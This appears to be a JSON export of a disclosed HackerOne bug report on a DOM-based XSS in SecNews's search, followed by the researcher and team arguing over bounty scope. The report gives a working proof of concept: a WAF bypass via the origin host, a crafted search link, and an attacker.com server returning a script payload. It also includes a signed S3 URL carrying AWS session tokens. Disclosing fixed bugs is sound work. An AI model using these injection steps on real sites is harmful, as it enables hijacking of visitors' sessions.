@@ -1,0 +1,411 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": true, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2016-10-17T19:07:09.981Z", 
+    "voters": [
+        "smit"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 168165, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "Overview\n===\nSearch query is inserted into the HTML of the page without proper encoding. Specifically, a single-quote is not html-encoded (albeit escaped, even twice), which allows the attacker to break out of the HTML attribute and inject arbitrary tags.\n\n```html\ncurl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o \".{47}?<test>.*?>\"\n<div id=\"content\" data-currentquery='{\"s\":\"\\\\'><test><\"}' class=\"main-content articles list sidebar-right    non-full\">\n```\n\nImpediments\n===\nAlthough aformentioned injection point can be used to carry out XSS attacks, there is a couple of complications.\n\n1. The website is protected by the CloudFlare WAF which blocks any suspicious requests. This can be circumvented though by instead targeting `secnews.wpengine.com`.\n2. The website has `X-XSS-Protection` header set which enables very powerful XSS Auditor in Google Chrome.\n3. The potential victim is administrator on a web security website. They are likely to have some kind of an XSS protection plugin installed in their browser.\n\nSolution\n===\nOne of the javascript plugins (colorbox) used by the website has a code path that inserts response from arbitrary URL into DOM tree. It allows the attacker to go from regular XSS to DOM based XSS that anti-XSS tools are not able to detect.\n\nSee a proof-of-concept video: F119742\n\n1. The attacker lures the victim to visit this link:\n    ```\n    https://www.secnews.gr/?s=%27%20class%3Dcolorbox%20href=/attacker.com:9999%3E\n    ```\n\n2. To any incoming requests the server at `attacker.com:9999` responds with:\n    ```\n    HTTP/1.1 200 OK\n    content-length: 39\n    access-control-allow-origin: *\n    access-control-allow-headers: x-requested-with\n    \n    <script>alert(document.domain)</script>\n    ```\n\n3. The victim clicks anywhere below the navigation bar.\n4. Malicious script gets downloaded and executed.\n\nSecurity Implications\n===\nAlthough this exploit requires the victim to click, I'm confident (and hope you are too) that it's only a question of time and effort to find a code path that executes injected script without user interaction.\n\nYou mention in the policy that you don't consider any XSS significant enough for bounty. Although I think that you underestimate the power of XSS, it's your call and I've had a lot of fun anyway.\n\n\n\n", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "medium", 
+        "author_type": "Team"
+    }, 
+    "title": "DOM based XSS in search functionality", 
+    "is_member_of_team?": null, 
+    "vote_count": 1, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 2913, 
+            "content": "When researchers don't understand english well, it's inconvenient, but at least it only hurts themselves. When the security team is not good at english, unfortunately it hurts all the researches.\n\nBig thanks to the team for adjusting the wording in the end.", 
+            "content_html": "<p>When researchers don&#39;t understand english well, it&#39;s inconvenient, but at least it only hurts themselves. When the security team is not good at english, unfortunately it hurts all the researches.</p>\n\n<p>Big thanks to the team for adjusting the wording in the end.</p>\n"
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2016-11-16T19:07:10.029Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "attachments": [
+        {
+            "file_name": "secnews-xss.m4v", 
+            "type": "video/mp4", 
+            "id": 119742, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/119/742/4be49f47c84123dbbd54b147da62367ac5571940/secnews-xss.m4v?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224651Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1e546bcc745e4c7934abccd980dceb284cb34d1fdb6e8f5d7437b118d43db368"
+        }
+    ], 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": true, 
+            "created_at": "2016-09-13T22:48:38.870Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-09-13T22:48:38.870Z", 
+            "actor": {
+                "url": "/secnews", 
+                "profile": {
+                    "name": "SecNews"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/417/a22cd44e0044aaf866443085128ef6106c811b0f_medium.?1464823532"
+                }
+            }, 
+            "team_handle": "secnews", 
+            "message": "Dear researcher\nIf you read the scope & policy of our program you will understand that we do not interested for XSS vulnerabilities at all. \nWe may only interested in complex XSS attacks that IN COMBINATION with other attacks which probably may exist, will lead to compromise of the website or exposure of\nsensitive data (like passwords, ability to upload shells etc).\nThank you very much in advance and we will be more than happy if you introduce us a severe or high risk vulnerability in the future.\n\nKind regards", 
+            "markdown_message": "<p>Dear researcher<br>\nIf you read the scope &amp; policy of our program you will understand that we do not interested for XSS vulnerabilities at all. <br>\nWe may only interested in complex XSS attacks that IN COMBINATION with other attacks which probably may exist, will lead to compromise of the website or exposure of<br>\nsensitive data (like passwords, ability to upload shells etc).<br>\nThank you very much in advance and we will be more than happy if you introduce us a severe or high risk vulnerability in the future.</p>\n\n<p>Kind regards</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1192379, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-09-14T08:06:57.723Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-09-14T08:06:57.723Z", 
+            "actor": {
+                "username": "sameoldstory", 
+                "url": "/sameoldstory", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/923/75ef2291250b9c7111bc077c4ea5139187bc4685_medium.png?1477814959"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "secnews", 
+            "message": "Although it may be a question of language, I think you might want to either tweak your automatic response or change the wording in your policy. The thing is that the policy text doesn't say that you are \"not interested for XSS vulnerabilities at all\". It does say that you don't pay money for it, but that's all it says.\n\nIn general it's better to be more explicit about what kinds of bugs you want researchers to submit. If XSS is out of scope (which is very unusual) then make sure you say so in the policy. If you're only interested in severe vulnerabilities then explicitly state it in the policy, not in the automatic response. Let's value each other's time.\n\nQuick comment about severity of XSS. I'm not sure if I need to tell you this, but XSS can be used to compromise website and expose sensitive data. You don't necessarily need to combine it with other attacks. Via XSS you can perform any actions on behalf of the victim account, including upload shells.", 
+            "markdown_message": "<p>Although it may be a question of language, I think you might want to either tweak your automatic response or change the wording in your policy. The thing is that the policy text doesn&#39;t say that you are &quot;not interested for XSS vulnerabilities at all&quot;. It does say that you don&#39;t pay money for it, but that&#39;s all it says.</p>\n\n<p>In general it&#39;s better to be more explicit about what kinds of bugs you want researchers to submit. If XSS is out of scope (which is very unusual) then make sure you say so in the policy. If you&#39;re only interested in severe vulnerabilities then explicitly state it in the policy, not in the automatic response. Let&#39;s value each other&#39;s time.</p>\n\n<p>Quick comment about severity of XSS. I&#39;m not sure if I need to tell you this, but XSS can be used to compromise website and expose sensitive data. You don&#39;t necessarily need to combine it with other attacks. Via XSS you can perform any actions on behalf of the victim account, including upload shells.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1192890, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-01T09:55:32.752Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-01T09:55:32.752Z", 
+            "actor": {
+                "username": "sameoldstory", 
+                "url": "/sameoldstory", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/923/75ef2291250b9c7111bc077c4ea5139187bc4685_medium.png?1477814959"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "secnews", 
+            "message": "Hello?", 
+            "markdown_message": "<p>Hello?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1227274, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-09T21:17:05.940Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-09T21:17:05.940Z", 
+            "actor": {
+                "username": "sameoldstory", 
+                "url": "/sameoldstory", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/923/75ef2291250b9c7111bc077c4ea5139187bc4685_medium.png?1477814959"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "secnews", 
+            "message": "Any updates? I understand that you're busy with iguru acquisition, but I would like to make sure you haven't forgotten about this report. After all, almost a month has passed since it was submitted and I haven't gotten *any* acknowledgement yet, even though the vulnerability has been fixed.", 
+            "markdown_message": "<p>Any updates? I understand that you&#39;re busy with iguru acquisition, but I would like to make sure you haven&#39;t forgotten about this report. After all, almost a month has passed since it was submitted and I haven&#39;t gotten <em>any</em> acknowledgement yet, even though the vulnerability has been fixed.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1239376, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-17T18:35:10.005Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-17T18:35:10.005Z", 
+            "actor": {
+                "username": "sameoldstory", 
+                "url": "/sameoldstory", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/923/75ef2291250b9c7111bc077c4ea5139187bc4685_medium.png?1477814959"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "secnews", 
+            "message": "Hello? I could really benefit from getting a +7 bump in the Hack The World competition.", 
+            "markdown_message": "<p>Hello? I could really benefit from getting a +7 bump in the Hack The World competition.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1251482, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-17T18:49:28.112Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-17T18:49:28.112Z", 
+            "actor": {
+                "username": "secnewsgr", 
+                "url": "/secnewsgr", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/082/405/25c93626f57a206579bfa094a43dfd0a05809e96_medium.jpeg?1464828354"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Medium", 
+                "old_severity": null
+            }, 
+            "team_handle": "secnews", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1251516, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "sameoldstory", 
+                "url": "/sameoldstory"
+            }, 
+            "created_at": "2016-10-17T18:50:52.500Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-17T18:50:52.500Z", 
+            "actor": {
+                "username": "secnewsgr", 
+                "url": "/secnewsgr", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/082/405/25c93626f57a206579bfa094a43dfd0a05809e96_medium.jpeg?1464828354"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "secnews", 
+            "message": "Dear sameoldstory, The vulnerability is not in SecNews scope for bounty through our published bug bounty policy program. For sure your objections about how severe or may not be a vulnerability found, will may guide us to review and make possible changes to our program in the near future.\n\nHackerone of course has its own rules, but accordingly there are rules that any business applies when announcing its one program (stricted or not) according to their decisions and requirements. \n\nAlthough more than 15 researchers have submitted us XSS vulnerabilities (+ 3 persons the same vuln you submit) and we have declined, closing as informative or not applicable, we will close that as resolved thus helping you for the HackWorld competition! Hope you get a high rank position there!\n\nKeep the good work!", 
+            "markdown_message": "<p>Dear sameoldstory, The vulnerability is not in SecNews scope for bounty through our published bug bounty policy program. For sure your objections about how severe or may not be a vulnerability found, will may guide us to review and make possible changes to our program in the near future.</p>\n\n<p>Hackerone of course has its own rules, but accordingly there are rules that any business applies when announcing its one program (stricted or not) according to their decisions and requirements. </p>\n\n<p>Although more than 15 researchers have submitted us XSS vulnerabilities (+ 3 persons the same vuln you submit) and we have declined, closing as informative or not applicable, we will close that as resolved thus helping you for the HackWorld competition! Hope you get a high rank position there!</p>\n\n<p>Keep the good work!</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1251517, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-17T18:51:13.236Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-17T18:51:13.236Z", 
+            "actor": {
+                "url": "/secnews", 
+                "profile": {
+                    "name": "SecNews"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/417/a22cd44e0044aaf866443085128ef6106c811b0f_medium.?1464823532"
+                }
+            }, 
+            "team_handle": "secnews", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::NotEligibleForBounty", 
+            "id": 1251518, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-17T19:07:10.003Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-17T19:07:10.003Z", 
+            "actor": {
+                "username": "sameoldstory", 
+                "url": "/sameoldstory", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/923/75ef2291250b9c7111bc077c4ea5139187bc4685_medium.png?1477814959"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "secnews", 
+            "first_to_agree": true, 
+            "message": "Thank you, you're awesome!\n\nLet's disclose full report and comments?\n\nOn a side note, if I were one of those researchers that got their XSS reports closed as informative or not applicable, I would argue that your policy does not explicitly put XSS out of scope. If the policy text does not, in one way or another, say \"XSS is out of scope\" the bug should be closed as resolved.  Which you did for this one, which is great, but I feel bad for other researchers.", 
+            "markdown_message": "<p>Thank you, you&#39;re awesome!</p>\n\n<p>Let&#39;s disclose full report and comments?</p>\n\n<p>On a side note, if I were one of those researchers that got their XSS reports closed as informative or not applicable, I would argue that your policy does not explicitly put XSS out of scope. If the policy text does not, in one way or another, say &quot;XSS is out of scope&quot; the bug should be closed as resolved.  Which you did for this one, which is great, but I feel bad for other researchers.</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1251555, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-19T07:16:31.524Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-19T07:16:31.524Z", 
+            "actor": {
+                "username": "sameoldstory", 
+                "url": "/sameoldstory", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/923/75ef2291250b9c7111bc077c4ea5139187bc4685_medium.png?1477814959"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "secnews", 
+            "message": "I mean, why would you waste your and 15 (!) researchers' time, instead of just spending 1 minute to write \"Out of scope: XSS\" in your policy?", 
+            "markdown_message": "<p>I mean, why would you waste your and 15 (!) researchers&#39; time, instead of just spending 1 minute to write &quot;Out of scope: XSS&quot; in your policy?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1255141, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-24T09:21:34.337Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-24T09:21:34.337Z", 
+            "actor": {
+                "url": "/secnews", 
+                "profile": {
+                    "name": "SecNews"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/417/a22cd44e0044aaf866443085128ef6106c811b0f_medium.?1464823532"
+                }
+            }, 
+            "team_handle": "secnews", 
+            "message": "We have added the wording on our program at the end of our sentence if you or others misunderstand \"Additionally, the following will not be considered significant & severe vulnerabilities for bounty (Out of Scope): ...\n\nThank you for your note.\n\n", 
+            "markdown_message": "<p>We have added the wording on our program at the end of our sentence if you or others misunderstand &quot;Additionally, the following will not be considered significant &amp; severe vulnerabilities for bounty (Out of Scope): ...</p>\n\n<p>Thank you for your note.</p>\n", 
+            "type": "Activities::CommentsClosed", 
+            "id": 1263923, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-16T19:07:23.301Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-16T19:07:23.301Z", 
+            "actor": {
+                "url": "/secnews", 
+                "profile": {
+                    "name": "SecNews"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/417/a22cd44e0044aaf866443085128ef6106c811b0f_medium.?1464823532"
+                }
+            }, 
+            "team_handle": "secnews", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1302914, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "sameoldstory", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/sameoldstory", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/096/923/4656052791e5e1d5f36b0918517494d59195d682_small.png?1477814959"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 60, 
+        "name": "Cross-site Scripting (XSS) - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -64813181.375780344, 
+    "disclosed_at": "2016-11-16T19:07:23.280Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/168165", 
+    "created_at": "2016-09-13T22:48:38.697Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h1 id=\"overview\">Overview</h1>\n\n<p>Search query is inserted into the HTML of the page without proper encoding. Specifically, a single-quote is not html-encoded (albeit escaped, even twice), which allows the attacker to break out of the HTML attribute and inject arbitrary tags.</p>\n<pre class=\"highlight html\"><code>curl -s &#39;https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C&#39; | egrep -o &quot;.{47}?<span class=\"nt\">&lt;test&gt;</span>.*?&gt;&quot;\n<span class=\"nt\">&lt;div</span> <span class=\"na\">id=</span><span class=\"s\">&quot;content&quot;</span> <span class=\"na\">data-currentquery=</span><span class=\"s\">&#39;{&quot;s&quot;:&quot;\\\\&#39;</span><span class=\"nt\">&gt;&lt;test&gt;</span><span class=\"err\">&lt;</span>&quot;}&#39; class=&quot;main-content articles list sidebar-right    non-full&quot;&gt;\n</code></pre>\n<h1 id=\"impediments\">Impediments</h1>\n\n<p>Although aformentioned injection point can be used to carry out XSS attacks, there is a couple of complications.</p>\n\n<ol>\n<li>The website is protected by the CloudFlare WAF which blocks any suspicious requests. This can be circumvented though by instead targeting <code>secnews.wpengine.com</code>.</li>\n<li>The website has <code>X-XSS-Protection</code> header set which enables very powerful XSS Auditor in Google Chrome.</li>\n<li>The potential victim is administrator on a web security website. They are likely to have some kind of an XSS protection plugin installed in their browser.</li>\n</ol>\n\n<h1 id=\"solution\">Solution</h1>\n\n<p>One of the javascript plugins (colorbox) used by the website has a code path that inserts response from arbitrary URL into DOM tree. It allows the attacker to go from regular XSS to DOM based XSS that anti-XSS tools are not able to detect.</p>\n\n<p>See a proof-of-concept video: <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"secnews-xss.m4v\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/119/742/4be49f47c84123dbbd54b147da62367ac5571940/secnews-xss.m4v?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224651Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=1e546bcc745e4c7934abccd980dceb284cb34d1fdb6e8f5d7437b118d43db368\" data-attachment-type=\"video/mp4\">secnews-xss.m4v (F119742)</a></p>\n\n<ol>\n<li>\n<p>The attacker lures the victim to visit this link:</p>\n<pre class=\"highlight plaintext\"><code>https://www.secnews.gr/?s=%27%20class%3Dcolorbox%20href=/attacker.com:9999%3E\n</code></pre>\n</li>\n<li>\n<p>To any incoming requests the server at <code>attacker.com:9999</code> responds with:</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\ncontent-length: 39\naccess-control-allow-origin: *\naccess-control-allow-headers: x-requested-with\n\n&lt;script&gt;alert(document.domain)&lt;/script&gt;\n</code></pre>\n</li>\n<li><p>The victim clicks anywhere below the navigation bar.</p></li>\n<li><p>Malicious script gets downloaded and executed.</p></li>\n</ol>\n\n<h1 id=\"security-implications\">Security Implications</h1>\n\n<p>Although this exploit requires the victim to click, I&#39;m confident (and hope you are too) that it&#39;s only a question of time and effort to find a code path that executes injected script without user interaction.</p>\n\n<p>You mention in the policy that you don&#39;t consider any XSS significant enough for bounty. Although I think that you underestimate the power of XSS, it&#39;s your call and I&#39;ve had a lot of fun anyway.</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.secnews.gr", 
+            "about": "SecNews is a greek website, which informs the visitors about the latest news in Hacking  & IT Security industry.", 
+            "twitter_handle": "SecNews_GR", 
+            "name": "SecNews"
+        }, 
+        "handle": "secnews", 
+        "url": "https://hackerone.com/secnews", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/013/417/47c85b8bd74ec483edaf63add2e1800968518162_small.?1464823532", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/013/417/a22cd44e0044aaf866443085128ef6106c811b0f_medium.?1464823532"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 13417, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
